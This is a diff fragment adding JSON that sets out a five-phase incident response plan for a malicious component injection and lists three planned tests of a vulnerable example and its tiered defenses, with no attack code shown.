+        "activities": [
+          "Alert fires: malicious component injection detected",
+          "Security team receives notification",
+          "Automated log collection begins"
+        ]
+      },
+      "2_containment": {
+        "duration": "5-15 minutes",
+        "rto": "15 minutes",
+        "activities": [
+          "Block attacker IP addresses",
+          "Disable compromised accounts",
+          "Deploy emergency patch"
+        ]
+      },
+      "3_investigation": {
+        "duration": "1-4 hours",
+        "activities": [
+          "Analyze attack timeline",
+          "Identify compromised components",
+          "Assess blast radius"
+        ]
+      },
+      "4_remediation": {
+        "duration": "4-24 hours",
+        "activities": [
+          "Deploy secure code version",
+          "Rotate credentials",
+          "Update firewall rules"
+        ]
+      },
+      "5_post_incident": {
+        "duration": "24-72 hours",
+        "activities": [
+          "User notification if required",
+          "Regulatory reporting",
+          "Post-incident review"
+        ]
+      }
+    }
+  },
+  "testing": {
+    "additional_tests": [
+      {
+        "name": "testVulnerabilityExploitability",
+        "description": "Verify vulnerable code is exploitable"
+      },
+      {
+        "name": "testTier1Defense",
+        "description": "Verify Tier 1 fix blocks attack"
+      },
+      {
+        "name": "testTier2Defense",
+        "description": "Verify Tier 2 production defenses work"
+      }
+    ],
+    "coverage_target": "90%+",
+    "test_count": 3
+  }
+}
